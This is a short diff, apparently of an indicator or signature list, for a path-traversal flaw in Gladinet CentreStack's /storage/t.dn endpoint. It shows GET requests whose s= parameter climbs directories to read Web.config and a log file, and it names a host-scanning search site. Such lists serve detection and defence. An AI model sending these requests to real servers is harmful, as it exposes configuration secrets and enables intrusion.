@@ -1,8 +1,6 @@
 /storage/t.dn
 GET /storage/t.dn?s=..\..\..\Program+Files+(x86)\Gladinet+Cloud+Enterprise\root\Web.config&sid=1
 GET /storage/t.dn?s=..\..\..\programdata\CentreStac_log.txt&sid=1
-s=..\..\
-..\..\..\
 ..\..\..\Program+Files+(x86)\Gladinet+Cloud+Enterprise\root\Web.config
 ..\..\..\programdata\CentreStac_log.txt
 en.fofa.info
